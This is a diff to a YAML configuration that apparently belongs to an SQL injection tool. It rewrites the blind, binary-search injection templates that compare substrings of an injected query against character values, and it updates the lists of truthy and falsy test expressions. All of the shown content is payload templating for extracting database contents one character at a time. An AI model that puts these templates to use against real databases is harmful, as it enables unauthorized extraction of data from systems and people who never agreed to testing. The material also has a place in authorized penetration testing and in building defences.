@@ -137,26 +137,26 @@ strategy:
     ))
     %26${bit}
    bin: |
-    ascii_code(substring(
+    substring(
         (${injection}),
         ${window.char},
         1
-    ))
-    %3E%3Dascii_code(ascii_char(${mid.int}))
+    )
+    %3E%3Dascii_char(${mid.int})
    truthyBin:
-    - ascii_code(ascii_char(97))%3E%3Dascii_code(ascii_char(97))
-    - ascii_code(ascii_char(97))%3E%3Dascii_code(ascii_char(65))
-    - ascii_code(ascii_char(97))%3E%3Dascii_code(ascii_char(48))
-    - ascii_code(ascii_char(98))%3E%3Dascii_code(ascii_char(97))
-    - ascii_code(ascii_char(98))%3E%3Dascii_code(ascii_char(66))
-    - ascii_code(ascii_char(49))%3E%3Dascii_code(ascii_char(48))
+    - ascii_char(97)%3E%3Dascii_char(97)
+    - ascii_char(97)%3E%3Dascii_char(65)
+    - ascii_char(97)%3E%3Dascii_char(48)
+    - ascii_char(98)%3E%3Dascii_char(97)
+    - ascii_char(98)%3E%3Dascii_char(66)
+    - ascii_char(49)%3E%3Dascii_char(48)
    falsyBin:
-    - ascii_code(ascii_char(97))%3E%3Dascii_code(ascii_char(98))
-    - ascii_code(ascii_char(65))%3E%3Dascii_code(ascii_char(97))
-    - ascii_code(ascii_char(66))%3E%3Dascii_code(ascii_char(98))
-    - ascii_code(ascii_char(66))%3E%3Dascii_code(ascii_char(97))
-    - ascii_code(ascii_char(48))%3E%3Dascii_code(ascii_char(65))
-    - ascii_code(ascii_char(48))%3E%3Dascii_code(ascii_char(49))
+    - ascii_char(97)%3E%3Dascii_char(98)
+    - ascii_char(65)%3E%3Dascii_char(97)
+    - ascii_char(66)%3E%3Dascii_char(98)
+    - ascii_char(66)%3E%3Dascii_char(97)
+    - ascii_char(48)%3E%3Dascii_char(65)
+    - ascii_char(48)%3E%3Dascii_char(49)
   modeAnd: and
   modeOr: or
   blind: ${binary.mode} ${test}
